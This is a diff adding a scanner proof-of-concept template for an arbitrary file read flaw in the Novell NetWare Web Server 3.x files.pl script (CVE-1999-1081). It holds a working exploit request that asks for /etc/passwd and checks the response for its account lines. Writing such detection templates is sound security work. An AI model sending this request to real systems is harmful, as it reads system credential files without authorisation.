@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "验证 Novell NetWare Web Server 3.x 随附的 files.pl 脚本是否存在任意文件读取漏洞。通过构造 file 参数请求服务器上的敏感文件，若返回文件内容则说明漏洞存在。"
+id = "POC-AVE-1999-0926"
+name = "Novell NetWare Web Server 3.x files.pl 任意文件读取漏洞 PoC"
+severity = "medium"
+tags = ["ave-1999-0926"]
+vuln_id = [
+    "CVE-1999-1081",
+    "AVE-1999-0926",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/perl/files.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "file=/etc/passwd"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "daemon:",
+    "bin:",
+]
